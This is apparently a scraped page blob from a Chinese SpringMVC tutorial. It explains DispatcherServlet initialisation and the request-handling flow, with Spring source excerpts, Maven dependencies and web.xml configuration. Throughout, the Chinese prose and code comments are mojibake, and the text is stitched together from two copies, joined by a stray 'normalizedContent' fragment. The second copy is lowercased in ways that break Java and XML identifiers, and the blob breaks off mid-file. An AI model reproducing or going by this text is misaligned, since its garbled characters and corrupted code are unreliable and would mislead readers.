¶å®ç»ä»¶å¤çç¨æ·çè¯·æ± HandlerMappingï¼å¤çå¨æ å°å¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼æ ¹æ®è¯·æ±çurlãmethodç­ä¿¡æ¯æ¥æ¾Handlerï¼å³æ§å¶å¨æ¹æ³ Handlerï¼å¤çå¨ï¼éè¦å·¥ç¨å¸å¼å ä½ç¨ï¼å¨DispatcherServletçæ§å¶ä¸Handlerå¯¹å·ä½çç¨æ·è¯·æ±è¿è¡å¤ç HandlerAdapterï¼å¤çå¨ééå¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼éè¿HandlerAdapterå¯¹å¤çå¨ï¼æ§å¶å¨æ¹æ³ï¼è¿è¡æ§è¡ ViewResolverï¼è§å¾è§£æå¨ï¼ä¸éè¦å·¥ç¨å¸å¼åï¼ç±æ¡æ¶æä¾ ä½ç¨ï¼è¿è¡è§å¾è§£æï¼å¾å°ç¸åºçè§å¾ï¼ä¾å¦ï¼ThymeleafViewãInternalResourceViewãRedirectView Viewï¼è§å¾ ä½ç¨ï¼å°æ¨¡åæ°æ®éè¿é¡µé¢å±ç¤ºç»ç¨æ·\n\n\n# DispatcherServletåå§åè¿ç¨\n\nDispatcherServlet æ¬è´¨ä¸æ¯ä¸ä¸ª Servletï¼æä»¥å¤©ç¶çéµå¾ª Servlet ççå½å¨æãæä»¥å®è§ä¸æ¯ Servlet çå½å¨ææ¥è¿è¡è°åº¦ã\n\n\n\n\n# åå§åWebApplicationContext\n\næå¨ç±»ï¼org.springframework.web.servlet.FrameworkServlet\n\nprotected WebApplicationContext initWebApplicationContext() {\n    WebApplicationContext rootContext =\n        WebApplicationContextUtils.getWebApplicationContext(getServletContext());\n    WebApplicationContext wac = null;\n\n    if (this.webApplicationContext != null) {\n        // A context instance was injected at construction time -> use it\n        wac = this.webApplicationContext;\n        if (wac instanceof ConfigurableWebApplicationContext) {\n            ConfigurableWebApplicationContext cwac = (ConfigurableWebApplicationContext) wac;\n            if (!cwac.isActive()) {\n                // The context has not yet been refreshed -> provide services such as\n                // setting the parent context, setting the application context id, etc\n                if (cwac.getParent() == null) {\n                    // The context instance was injected without an explicit parent -> set\n                    // the root application context (if any; may be null) as the parent\n                    cwac.setParent(rootContext);\n                }\n                configureAndRefreshWebApplicationContext(cwac);\n            }\n        }\n    }\n    if (wac == null) {\n        // No context instance was injected at construction time -> see if one\n        // has been registered in the servlet context. If one exists, it is assumed\n        // that the parent context (if any) has already been set and that the\n        // user has performed any initialization such as setting the context id\n        wac = findWebApplicationContext();\n    }\n    if (wac == null) {\n        // No context instance is defined for this servlet -> create a local one\n        // åå»ºWebApplicationContext\n        wac = createWebApplicationContext(rootContext);\n    }\n\n    if (!this.refreshEventReceived) {\n        // Either the context is not a ConfigurableApplicationContext with refresh\n        // support or the context injected at construction time had already been\n        // refreshed -> trigger initial onRefresh manually here.\n        synchronized (this.onRefreshMonitor) {\n            // å·æ°WebApplicationContext\n            onRefresh(wac);\n        }\n    }\n\n    if (this.publishContext) {\n        // Publish the context as a servlet context attribute.\n        // å°IOCå®¹å¨å¨åºç¨åå±äº«\n        String attrName = getServletContextAttributeName();\n        getServletContext().setAttribute(attrName, wac);\n    }\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n\n# åå»ºWebApplicationContext\n\næå¨ç±»ï¼org.springframework.web.servlet.FrameworkServlet\n\nprotected WebApplicationContext createWebApplicationContext(@Nullable ApplicationContext parent) {\n    Class<?> contextClass = getContextClass();\n    if (!ConfigurableWebApplicationContext.class.isAssignableFrom(contextClass)) {\n        throw new ApplicationContextException(\n            "Fatal initialization error in servlet with name \'" + getServletName() +\n            "\': custom WebApplicationContext class [" + contextClass.getName() +\n            "] is not of type ConfigurableWebApplicationContext");\n    }\n    // éè¿åå°åå»º IOC å®¹å¨å¯¹è±¡\n    ConfigurableWebApplicationContext wac =\n        (ConfigurableWebApplicationContext) BeanUtils.instantiateClass(contextClass);\n\n    wac.setEnvironment(getEnvironment());\n    // è®¾ç½®ç¶å®¹å¨\n    wac.setParent(parent);\n    String configLocation = getContextConfigLocation();\n    if (configLocation != null) {\n        wac.setConfigLocation(configLocation);\n    }\n    configureAndRefreshWebApplicationContext(wac);\n\n    return wac;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# DispatcherServletåå§åç­ç¥\n\nFrameworkServletåå»ºWebApplicationContextåï¼å·æ°å®¹å¨ï¼è°ç¨onRefresh(wac)ï¼æ­¤æ¹æ³å¨DispatcherServletä¸­è¿è¡äºéåï¼è°ç¨äºinitStrategies(context)æ¹æ³ï¼åå§åç­ç¥ï¼å³åå§åDispatcherServletçåä¸ªç»ä»¶ æå¨ç±»ï¼org.springframework.web.servlet.DispatcherServlet\n\nprotected void initStrategies(ApplicationContext context) {\n   initMultipartResolver(context);\n   initLocaleResolver(context);\n   initThemeResolver(context);\n   initHandlerMappings(context);\n   initHandlerAdapters(context);\n   initHandlerExceptionResolvers(context);\n   initRequestToViewNameTranslator(context);\n   initViewResolvers(context);\n   initFlashMapManager(context);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# DispatcherServletè°ç¨ç»ä»¶å¤çè¯·æ±\n\n# processRequest()\n\nFrameworkServletéåHttpServletä¸­çservice()ådoXxx()ï¼è¿äºæ¹æ³ä¸­è°ç¨äºprocessRequest(request, response) æå¨ç±»ï¼org.springframework.web.servlet.FrameworkServlet\n\nprotected final void processRequest(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n\n    long startTime = System.currentTimeMillis();\n    Throwable failureCause = null;\n\n    LocaleContext previousLocaleContext = LocaleContextHolder.getLocaleContext();\n    LocaleContext localeContext = buildLocaleContext(request);\n\n    RequestAttributes previousAttributes = RequestContextHolder.getRequestAttributes();\n    ServletRequestAttributes requestAttributes = buildRequestAttributes(request, response, previousAttributes);\n\n    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);\n    asyncManager.registerCallableInterceptor(FrameworkServlet.class.getName(), new RequestBindingInterceptor());\n\n    initContextHolders(request, localeContext, requestAttributes);\n\n    try {\n        // æ§è¡æå¡ï¼doService()æ¯ä¸ä¸ªæ½è±¡æ¹æ³ï¼å¨DispatcherServletä¸­è¿è¡äºéå\n        doService(request, response);\n    }\n    catch (ServletException | IOException ex) {\n        failureCause = ex;\n        throw ex;\n    }\n    catch (Throwable ex) {\n        failureCause = ex;\n        throw new NestedServletException("Request processing failed", ex);\n    }\n\n    finally {\n        resetContextHolders(request, previousLocaleContext, previousAttributes);\n        if (requestAttributes != null) {\n            requestAttributes.requestCompleted();\n        }\n        logResult(request, response, failureCause, asyncManager);\n        publishRequestHandledEvent(request, response, startTime, failureCause);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n\n\n# doService()\n\næå¨ç±»ï¼org.springframework.web.servlet.DispatcherServlet\n\n@Override\nprotected void doService(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    logRequest(request);\n\n    // Keep a snapshot of the request attributes in case of an include,\n    // to be able to restore the original attributes after the include.\n    Map<String, Object> attributesSnapshot = null;\n    if (WebUtils.isIncludeRequest(request)) {\n        attributesSnapshot = new HashMap<>();\n        Enumeration<?> attrNames = request.getAttributeNames();\n        while (attrNames.hasMoreElements()) {\n            String attrName = (String) attrNames.nextElement();\n            if (this.cleanupAfterInclude || attrName.startsWith(DEFAULT_STRATEGIES_PREFIX)) {\n                attributesSnapshot.put(attrName, request.getAttribute(attrName));\n            }\n        }\n    }\n\n    // Make framework objects available to handlers and view objects.\n    request.setAttribute(WEB_APPLICATION_CONTEXT_ATTRIBUTE, getWebApplicationContext());\n    request.setAttribute(LOCALE_RESOLVER_ATTRIBUTE, this.localeResolver);\n    request.setAttribute(THEME_RESOLVER_ATTRIBUTE, this.themeResolver);\n    request.setAttribute(THEME_SOURCE_ATTRIBUTE, getThemeSource());\n\n    if (this.flashMapManager != null) {\n        FlashMap inputFlashMap = this.flashMapManager.retrieveAndUpdate(request, response);\n        if (inputFlashMap != null) {\n            request.setAttribute(INPUT_FLASH_MAP_ATTRIBUTE, Collections.unmodifiableMap(inputFlashMap));\n        }\n        request.setAttribute(OUTPUT_FLASH_MAP_ATTRIBUTE, new FlashMap());\n        request.setAttribute(FLASH_MAP_MANAGER_ATTRIBUTE, this.flashMapManager);\n    }\n\n    RequestPath requestPath = null;\n    if (this.parseRequestPath && !ServletRequestPathUtils.hasParsedRequestPath(request)) {\n        requestPath = ServletRequestPathUtils.parseAndCache(request);\n    }\n\n    try {\n        // å¤çè¯·æ±åååº\n        doDispatch(request, response);\n    }\n    finally {\n        if (!WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) {\n            // Restore the original attribute snapshot, in case of an include.\n            if (attributesSnapshot != null) {\n                restoreAttributesAfterInclude(request, attributesSnapshot);\n            }\n        }\n        if (requestPath != null) {\n            ServletRequestPathUtils.clearParsedRequestPath(request);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n# doDispatch()\n\næå¨ç±»ï¼org.springframework.web.servlet.DispatcherServlet\n\nprotected void doDispatch(HttpServletRequest request, HttpServletResponse response) throws Exception {\n    HttpServletRequest processedRequest = request;\n    HandlerExecutionChain mappedHandler = null;\n    boolean multipartRequestParsed = false;\n\n    WebAsyncManager asyncManager = WebAsyncUtils.getAsyncManager(request);\n\n    try {\n        ModelAndView mv = null;\n        Exception dispatchException = null;\n\n        try {\n            processedRequest = checkMultipart(request);\n            multipartRequestParsed = (processedRequest != request);\n\n            // Determine handler for the current request.\n            /*\n                mappedHandlerï¼è°ç¨é¾\n                åå«handlerãinterceptorListãinterceptorIndex\n                handlerï¼æµè§å¨åéçè¯·æ±æå¹éçæ§å¶å¨æ¹æ³\n                interceptorListï¼å¤çæ§å¶å¨æ¹æ³çæææ¦æªå¨éå\n                interceptorIndexï¼æ¦æªå¨ç´¢å¼ï¼æ§å¶æ¦æªå¨afterCompletion()çæ§è¡\n            */\n            mappedHandler = getHandler(processedRequest);\n            if (mappedHandler == null) {\n                noHandlerFound(processedRequest, response);\n                return;\n            }\n\n            // Determine handler adapter for the current request.\n               // éè¿æ§å¶å¨æ¹æ³åå»ºç¸åºçå¤çå¨ééå¨ï¼è°ç¨æå¯¹åºçæ§å¶å¨æ¹æ³\n            HandlerAdapter ha = getHandlerAdapter(mappedHandler.getHandler());\n\n            // Process last-modified header, if supported by the handler.\n            String method = request.getMethod();\n            boolean isGet = "GET".equals(method);\n            if (isGet || "HEAD".equals(method)) {\n                long lastModified = ha.getLastModified(request, mappedHandler.getHandler());\n                if (new ServletWebRequest(request, response).checkNotModified(lastModified) && isGet) {\n                    return;\n                }\n            }\n\n            // è°ç¨æ¦æªå¨çpreHandle()\n            if (!mappedHandler.applyPreHandle(processedRequest, response)) {\n                return;\n            }\n\n            // Actually invoke the handler.\n            // ç±å¤çå¨ééå¨è°ç¨å·ä½çæ§å¶å¨æ¹æ³ï¼æç»è·å¾ModelAndViewå¯¹è±¡\n            mv = ha.handle(processedRequest, response, mappedHandler.getHandler());\n\n            if (asyncManager.isConcurrentHandlingStarted()) {\n                return;\n            }\n\n            applyDefaultViewName(processedRequest, mv);\n            // è°ç¨æ¦æªå¨çpostHandle()\n            mappedHandler.applyPostHandle(processedRequest, response, mv);\n        }\n        catch (Exception ex) {\n            dispatchException = ex;\n        }\n        catch (Throwable err) {\n            // As of 4.3, we\'re processing Errors thrown from handler methods as well,\n            // making them available for @ExceptionHandler methods and other scenarios.\n            dispatchException = new NestedServletException("Handler dispatch failed", err);\n        }\n        // åç»­å¤çï¼å¤çæ¨¡åæ°æ®åæ¸²æè§å¾\n        processDispatchResult(processedRequest, response, mappedHandler, mv, dispatchException);\n    }\n    catch (Exception ex) {\n        triggerAfterCompletion(processedRequest, response, mappedHandler, ex);\n    }\n    catch (Throwable err) {\n        triggerAfterCompletion(processedRequest, response, mappedHandler,\n                               new NestedServletException("Handler processing failed", err));\n    }\n    finally {\n        if (asyncManager.isConcurrentHandlingStarted()) {\n            // Instead of postHandle and afterCompletion\n            if (mappedHandler != null) {\n                mappedHandler.applyAfterConcurrentHandlingStarted(processedRequest, response);\n            }\n        }\n        else {\n            // Clean up any resources used by a multipart request.\n            if (multipartRequestParsed) {\n                cleanupMultipart(processedRequest);\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n\n\n# processDispatchResult()\n\nprivate void processDispatchResult(HttpServletRequest request, HttpServletResponse response,\n                                   @Nullable HandlerExecutionChain mappedHandler, @Nullable ModelAndView mv,\n                                   @Nullable Exception exception) throws Exception {\n\n    boolean errorView = false;\n\n    if (exception != null) {\n        if (exception instanceof ModelAndViewDefiningException) {\n            logger.debug("ModelAndViewDefiningException encountered", exception);\n            mv = ((ModelAndViewDefiningException) exception).getModelAndView();\n        }\n        else {\n            Object handler = (mappedHandler != null ? mappedHandler.getHandler() : null);\n            mv = processHandlerException(request, response, handler, exception);\n            errorView = (mv != null);\n        }\n    }\n\n    // Did the handler return a view to render?\n    if (mv != null && !mv.wasCleared()) {\n        // å¤çæ¨¡åæ°æ®åæ¸²æè§å¾\n        render(mv, request, response);\n        if (errorView) {\n            WebUtils.clearErrorRequestAttributes(request);\n        }\n    }\n    else {\n        if (logger.isTraceEnabled()) {\n            logger.trace("No view rendering, null ModelAndView returned.");\n        }\n    }\n\n    if (WebAsyncUtils.getAsyncManager(request).isConcurrentHandlingStarted()) {\n        // Concurrent handling started during a forward\n        return;\n    }\n\n    if (mappedHandler != null) {\n        // Exception (if any) is already handled..\n        // è°ç¨æ¦æªå¨çafterCompletion()\n        mappedHandler.triggerAfterCompletion(request, response, null);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\n\n# SpringMVCçæ§è¡æµç¨\n\nç¨æ·åæå¡å¨åéè¯·æ±ï¼è¯·æ±è¢«SpringMVC åç«¯æ§å¶å¨ DispatcherServletæè·ã DispatcherServletå¯¹è¯·æ±URLè¿è¡è§£æï¼å¾å°è¯·æ±èµæºæ è¯ç¬¦ï¼URIï¼ï¼å¤æ­è¯·æ±URIå¯¹åºçæ å°ï¼\n\n 1. ä¸å­å¨ i. åå¤æ­æ¯å¦éç½®äºmvc:default-servlet-handler ii. å¦ææ²¡éç½®ï¼åæ§å¶å°æ¥æ å°æ¥æ¾ä¸å°ï¼å®¢æ·ç«¯å±ç¤º404éè¯¯\n\n\n\niii. å¦ææéç½®ï¼åè®¿é®ç®æ èµæºï¼ä¸è¬ä¸ºéæèµæºï¼å¦ï¼JS,CSS,HTMLï¼ï¼æ¾ä¸å°å®¢æ·ç«¯ä¹ä¼å±ç¤º404éè¯¯\n\n\n\n 2. å­å¨åæ§è¡ä¸é¢çæµç¨\n    \n    æ ¹æ®è¯¥URIï¼è°ç¨HandlerMappingè·å¾è¯¥Handleréç½®çææç¸å³çå¯¹è±¡ï¼åæ¬Handlerå¯¹è±¡ä»¥åHandlerå¯¹è±¡å¯¹åºçæ¦æªå¨ï¼ï¼æåä»¥HandlerExecutionChainæ§è¡é¾å¯¹è±¡çå½¢å¼è¿åã\n    \n    DispatcherServlet æ ¹æ®è·å¾çHandlerï¼éæ©ä¸ä¸ªåéçHandlerAdapterã\n    \n    å¦ææåè·å¾HandlerAdapterï¼æ­¤æ¶å°å¼å§æ§è¡æ¦æªå¨çpreHandler(â¦)æ¹æ³ãæ­£åã\n    \n    æåRequestä¸­çæ¨¡åæ°æ®ï¼å¡«åHandlerå¥åï¼å¼å§æ§è¡Handlerï¼Controller)æ¹æ³ï¼å¤çè¯·æ±ãå¨å¡«åHandlerçå¥åè¿ç¨ä¸­ï¼æ ¹æ®ä½ çéç½®ï¼Springå°å¸®ä½ åä¸äºé¢å¤çå·¥ä½ï¼\n    \n    a) HttpMessageConveterï¼ å°è¯·æ±æ¶æ¯ï¼å¦Jsonãxmlç­æ°æ®ï¼è½¬æ¢æä¸ä¸ªå¯¹è±¡ï¼å°å¯¹è±¡è½¬æ¢ä¸ºæå®çååºä¿¡æ¯\n    \n    b) æ°æ®è½¬æ¢ï¼å¯¹è¯·æ±æ¶æ¯è¿è¡æ°æ®è½¬æ¢ãå¦Stringè½¬æ¢æIntegerãDoubleç­\n    \n    c) æ°æ®æ ¼å¼åï¼å¯¹è¯·æ±æ¶æ¯è¿è¡æ°æ®æ ¼å¼åã å¦å°å­ç¬¦ä¸²è½¬æ¢ææ ¼å¼åæ°å­ææ ¼å¼åæ¥æç­\n    \n    d) æ°æ®éªè¯ï¼ éªè¯æ°æ®çæææ§ï¼é¿åº¦ãæ ¼å¼ç­ï¼ï¼éªè¯ç»æå­å¨å°BindingResultæErrorä¸­\n    \n    Handleræ§è¡å®æåï¼åDispatcherServlet è¿åä¸ä¸ªModelAndViewå¯¹è±¡ã\n    \n    æ­¤æ¶å°å¼å§æ§è¡æ¦æªå¨çpostHandle(...)æ¹æ³ãéåãã\n    \n    æ ¹æ®è¿åçModelAndViewï¼æ­¤æ¶ä¼å¤æ­æ¯å¦å­å¨å¼å¸¸ï¼å¦æå­å¨å¼å¸¸ï¼åæ§è¡HandlerExceptionResolverè¿è¡å¼å¸¸å¤çï¼éæ©ä¸ä¸ªéåçViewResolverè¿è¡è§å¾è§£æï¼æ ¹æ®ModelåViewï¼æ¥æ¸²æè§å¾ã\n    \n    æ¸²æè§å¾å®æ¯æ§è¡æ¦æªå¨çafterCompletion(â¦)æ¹æ³ãéåãã\n    \n    å°æ¸²æç»æè¿åç»å®¢æ·ç«¯ã',normalizedContent:'# springmvc\n\n\n# springmvcç®ä»\n\n\n# ä»ä¹æ¯mvc\n\nmvcæ¯ä¸ç§è½¯ä»¶æ¶æçææ³ï¼å°è½¯ä»¶æç§æ¨¡åãè§å¾ãæ§å¶å¨æ¥åå\n\nmï¼modelï¼æ¨¡åå±ï¼æå·¥ç¨ä¸­çjavabeanï¼ä½ç¨æ¯å¤çæ°æ® vï¼viewï¼è§å¾å±ï¼æå·¥ç¨ä¸­çhtmlæjspç­é¡µé¢ï¼ä½ç¨æ¯ä¸ç¨æ·è¿è¡äº¤äºï¼å±ç¤ºæ°æ® cï¼controllerï¼æ§å¶å±ï¼æå·¥ç¨ä¸­çservletï¼ä½ç¨æ¯æ¥æ¶è¯·æ±åååºæµè§å¨\n\nmvcçå·¥ä½æµç¨ï¼ ç¨æ·éè¿è§å¾å±åéè¯·æ±å°æå¡å¨ï¼å¨æå¡å¨ä¸­è¯·æ±è¢«controlleræ¥æ¶ï¼controllerè°ç¨ç¸åºçmodelå±å¤çè¯·æ±ï¼å¤çå®æ¯å°ç»æè¿åå°controllerï¼controlleråæ ¹æ®è¯·æ±å¤ççç»ææ¾å°ç¸åºçviewè§å¾ï¼æ¸²ææ°æ®åæç»ååºç»æµè§å¨\n\njavabeanåä¸ºä¸¤ç±»ï¼\n\n * ä¸ç±»ç§°ä¸ºå®ä½ç±»beanï¼ä¸é¨å­å¨ä¸å¡æ°æ®çï¼å¦ studentãuser ç­\n * ä¸ç±»ç§°ä¸ºä¸å¡å¤ç beanï¼æ service æ dao å¯¹è±¡ï¼ä¸é¨ç¨äºå¤çä¸å¡é»è¾åæ°æ®è®¿é®ã\n\n\n# ä»ä¹æ¯springmvc\n\nspringmvcæ¯springçä¸ä¸ªåç»­äº§åï¼æ¯springçä¸ä¸ªå­é¡¹ç® springmvc æ¯ spring ä¸ºè¡¨è¿°å±å¼åæä¾çä¸æ´å¥å®å¤çè§£å³æ¹æ¡ãå¨è¡¨è¿°å±æ¡æ¶åç» strustãwebworkãstrust2 ç­è¯¸å¤äº§åçåä»£æ´è¿­ä¹åï¼ç®åä¸çæ®ééæ©äº springmvc ä½ä¸º java ee é¡¹ç®è¡¨è¿°å±å¼åçé¦éæ¹æ¡ã\n\n> æ³¨ï¼ä¸å±æ¶æåä¸ºè¡¨è¿°å±ï¼æè¡¨ç¤ºå±ï¼ãä¸å¡é»è¾å±ãæ°æ®è®¿é®å±ï¼è¡¨è¿°å±è¡¨ç¤ºåå°é¡µé¢ååå°servlet\n\n\n# springmvcçç¹ç¹\n\n * spring å®¶æåçäº§åï¼ä¸ ioc å®¹å¨ç­åºç¡è®¾æ½æ ç¼å¯¹æ¥\n * åºäºåççservletï¼éè¿äºåè½å¼ºå¤§çåç«¯æ§å¶å¨dispatcherservletï¼å¯¹è¯·æ±åååºè¿è¡ç»ä¸å¤ç\n * è¡¨è¿°å±åç»åé¢åéè¦è§£å³çé®é¢å¨æ¹ä½è¦çï¼æä¾å¨é¢è§£å³æ¹æ¡\n * ä»£ç æ¸æ°ç®æ´ï¼å¤§å¹åº¦æåå¼åæç\n * åé¨ç»ä»¶åç¨åº¦é«ï¼å¯ææå¼ç»ä»¶å³æå³ç¨ï¼æ³è¦ä»ä¹åè½éç½®ç¸åºç»ä»¶å³å¯\n * æ§è½åèï¼å°¤å¶éåç°ä»£å¤§åãè¶å¤§åäºèç½é¡¹ç®è¦æ±\n\n\n# mvcå¼åç¯å¢æ­å»º\n\n\n# mavené¡¹ç®åå»º\n\nåå»ºmaven webé¡¹ç®ï¼å¼å¥mavenä¾èµ\n\n<dependencies>\n    \x3c!-- springmvc --\x3e\n    <dependency>\n        <groupid>org.springframework</groupid>\n        <artifactid>spring-webmvc</artifactid>\n        <version>5.3.1</version>\n    </dependency>\n\n    \x3c!-- æ¥å¿ --\x3e\n    <dependency>\n        <groupid>ch.qos.logback</groupid>\n        <artifactid>logback-classic</artifactid>\n        <version>1.2.3</version>\n    </dependency>\n\n    \x3c!-- servletapi --\x3e\n    <dependency>\n        <groupid>javax.servlet</groupid>\n        <artifactid>javax.servlet-api</artifactid>\n        <version>3.1.0</version>\n        <scope>provided</scope>\n    </dependency>\n\n    \x3c!-- spring5åthymeleafæ´åå --\x3e\n    <dependency>\n        <groupid>org.thymeleaf</groupid>\n        <artifactid>thymeleaf-spring5</artifactid>\n        <version>3.0.12.release</version>\n    </dependency>\n</dependencies>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\n\n# web.xmléç½®æä»¶\n\n# é»è®¤éç½®æ¹å¼\n\næ­¤éç½®ä½ç¨ä¸ï¼springmvcçéç½®æä»¶é»è®¤ä½äºweb-infä¸ï¼é»è®¤åç§°ä¸º<servlet-name>-servlet.xmlï¼ä¾å¦ï¼ä»¥ä¸éç½®æå¯¹åºspringmvcçéç½®æä»¶ä½äºweb-infä¸ï¼æä»¶åä¸ºspringmvc-servlet.xml\n\n\x3c!-- éç½®springmvcçåç«¯æ§å¶å¨ï¼å¯¹æµè§å¨åéçè¯·æ±ç»ä¸è¿è¡å¤ç --\x3e\n<servlet>\n    <servlet-name>springmvc</servlet-name>\n    <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springmvc</servlet-name>\n    \x3c!--\n        è®¾ç½®springmvcçæ ¸å¿æ§å¶å¨æè½å¤ççè¯·æ±çè¯·æ±è·¯å¾\n        /æå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾\n        ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n# æ©å±éç½®æ¹å¼\n\nå¯éè¿init-paramæ ç­¾è®¾ç½®springmvcéç½®æä»¶çä½ç½®ååç§°ï¼éè¿load-on-startupæ ç­¾è®¾ç½®springmvcåç«¯æ§å¶å¨dispatcherservletçåå§åæ¶é´\n\n\x3c!-- éç½®springmvcçåç«¯æ§å¶å¨ï¼å¯¹æµè§å¨åéçè¯·æ±ç»ä¸è¿è¡å¤ç --\x3e\n<servlet>\n    <servlet-name>springmvc</servlet-name>\n    <servlet-class>org.springframework.web.servlet.dispatcherservlet</servlet-class>\n    \x3c!-- éè¿åå§ååæ°æå®springmvcéç½®æä»¶çä½ç½®ååç§° --\x3e\n    <init-param>\n        \x3c!-- contextconfiglocationä¸ºåºå®å¼ --\x3e\n        <param-name>contextconfiglocation</param-name>\n        \x3c!-- ä½¿ç¨classpath:è¡¨ç¤ºä»ç±»è·¯å¾æ¥æ¾éç½®æä»¶ï¼ä¾å¦mavenå·¥ç¨ä¸­çsrc/main/resources --\x3e\n        <param-value>classpath:springmvc.xml</param-value>\n    </init-param>\n    \x3c!-- \n         ä½ä¸ºæ¡æ¶çæ ¸å¿ç»ä»¶ï¼å¨å¯å¨è¿ç¨ä¸­æå¤§éçåå§åæä½è¦å\n        èè¿äºæä½æ¾å¨ç¬¬ä¸æ¬¡è¯·æ±æ¶ææ§è¡ä¼ä¸¥éå½±åè®¿é®éåº¦\n        å æ­¤éè¦éè¿æ­¤æ ç­¾å°å¯å¨æ§å¶dispatcherservletçåå§åæ¶é´æåå°æå¡å¨å¯å¨æ¶\n    --\x3e\n    <load-on-startup>1</load-on-startup>\n</servlet>\n<servlet-mapping>\n    <servlet-name>springmvc</servlet-name>\n    \x3c!--\n        è®¾ç½®springmvcçæ ¸å¿æ§å¶å¨æè½å¤ççè¯·æ±çè¯·æ±è·¯å¾\n        /æå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾\n        ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±\n    --\x3e\n    <url-pattern>/</url-pattern>\n</servlet-mapping>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n\n\n&lt;url-pattern>æ ç­¾ä¸­ä½¿ç¨/å/*çåºå«ï¼\næå¹éçè¯·æ±å¯ä»¥æ¯/loginæ.htmlæ.jsæ.cssæ¹å¼çè¯·æ±è·¯å¾ï¼ä½æ¯/ä¸è½å¹é.jspè¯·æ±è·¯å¾çè¯·æ±ãå æ­¤å°±å¯ä»¥é¿åå¨è®¿é®jspé¡µé¢æ¶ï¼è¯¥è¯·æ±è¢«dispatcherservletå¤çï¼ä»èæ¾ä¸å°ç¸åºçé¡µé¢\n/* åè½å¤å¹éææè¯·æ±ï¼ä¾å¦å¨ä½¿ç¨è¿æ»¤å¨æ¶ï¼è¥éè¦å¯¹ææè¯·æ±è¿è¡è¿æ»¤ï¼å°±éè¦ä½¿ç¨/\\*çåæ³\n\n\n1\n2\n3\n\n\n\n# åå»ºè¯·æ±æ§å¶å¨\n\nç±äºåç«¯æ§å¶å¨å¯¹æµè§å¨åéçè¯·æ±è¿è¡äºç»ä¸çå¤çï¼ä½æ¯å·ä½çè¯·æ±æä¸åçå¤çè¿ç¨ï¼å æ­¤éè¦åå»ºå¤çå·ä½è¯·æ±çç±»ï¼å³è¯·æ±æ§å¶å¨\n\nè¯·æ±æ§å¶å¨ä¸­æ¯ä¸ä¸ªå¤çè¯·æ±çæ¹æ³æä¸ºæ§å¶å¨æ¹æ³\n\nå ä¸ºspringmvcçæ§å¶å¨ç±ä¸ä¸ªpojoï¼æ®éçjavaç±»ï¼æä»»ï¼å æ­¤éè¦éè¿@controlleræ³¨è§£å°å¶æ è¯ä¸ºä¸ä¸ªæ§å¶å±ç»ä»¶ï¼äº¤ç»springçiocå®¹å¨ç®¡çï¼æ­¤æ¶springmvcæè½å¤è¯å«æ§å¶å¨çå­å¨\n\n@controller\npublic class hellocontroller {\n\n}\n\n\n1\n2\n3\n4\n\n\n\n# åå»ºspringmvcéç½®æä»¶\n\n<?xml version="1.0" encoding="utf-8"?>\n<beans xmlns="<http://www.springframework.org/schema/beans>"\n       xmlns:xsi="<http://www.w3.org/2001/xmlschema-instance>"\n       xmlns:context="<http://www.springframework.org/schema/context>"\n       